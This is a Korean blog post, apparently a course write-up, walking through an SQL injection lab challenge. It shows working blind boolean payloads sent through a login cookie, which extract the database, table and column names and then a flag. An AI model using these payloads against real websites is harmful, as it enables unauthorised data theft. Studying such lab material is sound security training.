---
layout: single
title:  "8 주차 SQL injection 데이터 추출 문제 풀이(1)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false
---

<br>

# <span style="background:#000000; color:#ffffff">1. 8 주차 SQL injection 데이터 추출 문제 풀이(1)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>

<br>

## <span style="background:#696969; color:#ffffff">1.1  SQLi Point 1 문제 </span>

<br>

<img src="/images/2024-06-09-SQLinjection25/image-20240612180428003.png" alt="image-20240612180428003" style="zoom:67%;" />

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span>

***

<br>

마이페이지와 게시판이 존재합니다. 우선 접근하기 쉬운 마이페이지를 확인해보도록 하겠습니다. 



![image-20240612180852525](/images/2024-06-09-SQLinjection25/image-20240612180852525.png)

먼저 GET 방식으로 데이터를 전송하고 있습니다. 그래서 밑에 파라미터가 없네요.   
그렇다면 로그인을 유지하기 위해서 어떤 데이터를 전송하는가 보면, cookie 를 보내고 있습니다.  

injection이 가능한가 확인해보면

![image-20240612181135622](/images/2024-06-09-SQLinjection25/image-20240612181135622.png)

![image-20240612181157164](/images/2024-06-09-SQLinjection25/image-20240612181157164.png)

위의 과정을 통해 sql구문을 사용하고 있다는 것을 알아낼 수 있습니다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.2  select 문구가 사용가능한 지 체크</span>

***

<br>

![image-20240612182315498](/images/2024-06-09-SQLinjection25/image-20240612182315498.png)

![image-20240612182340457](/images/2024-06-09-SQLinjection25/image-20240612182340457.png)



<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.3 공격 format 만들기</span>

***

<br>

1234' and ascii(substr((select ~~),1,1))>0 and '1'='1

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span>

***

<br>

1234' and ascii(substr((select database() limit 0,1),1,1))>0 and '1'='1

![image-20240612201232651](/images/2024-06-09-SQLinjection25/image-20240612201232651.png)

sqli_6

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span>

***

<br>

select table_name from information_schema.tables where table_schema='sqli_6' limit 0,1

1234' and ascii(substr((select table_name from information_schema.tables where table_schema='sqli_6' limit 0,1),1,1))>0 and '1'='1

![image-20240612201728349](/images/2024-06-09-SQLinjection25/image-20240612201728349.png)

board

![image-20240612201817181](/images/2024-06-09-SQLinjection25/image-20240612201817181.png)

flag_table

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span>

***

<br>

select column_name from information_schema.columns where table_name='flag_table' limit 0,1

1234' and ascii(substr((select column_name from information_schema.columns where table_name='flag_table' limit 0,1),1,1))>0 and '1'='1

![image-20240612202050063](/images/2024-06-09-SQLinjection25/image-20240612202050063.png)

idx

![image-20240612202118890](/images/2024-06-09-SQLinjection25/image-20240612202118890.png)

flag

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span>

***

<br>

select flag from flag_table limit 0,1 

1234' and ascii(substr((select flag from flag_table limit 0,1),1,1))>0 and '1'='1

![image-20240612202314180](/images/2024-06-09-SQLinjection25/image-20240612202314180.png)

flagIsHere! Come

![image-20240612202416269](/images/2024-06-09-SQLinjection25/image-20240612202416269.png)

segfault{~~}

